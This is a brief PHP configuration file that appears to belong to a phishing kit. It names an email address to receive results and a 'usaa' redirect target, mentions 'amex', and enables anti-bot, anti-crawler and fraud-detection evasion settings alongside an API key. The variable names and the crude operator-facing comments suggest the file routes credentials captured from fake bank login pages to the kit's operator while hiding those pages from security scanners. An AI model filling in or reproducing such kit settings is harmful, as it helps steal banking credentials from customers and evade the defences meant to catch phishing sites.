<?php


$your_email = "abdohamdy660s@gmail.com"; // Your Fucking Email Here bro !! 
$redirect = "usaa"; // you can change this 

$redirection = "no";   // If you won't to Use Redirection Like { Domain.com?id=amex } Make it Yes .
$spox_protection = "no";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "EZgZ242eUNEISwr8iAMQycltKiDYCAAU"; // Your Key api protection DON't CHANGE IT BRO ...

$anti_bot = "yes";
$anti_web_crawler ="yes";

?>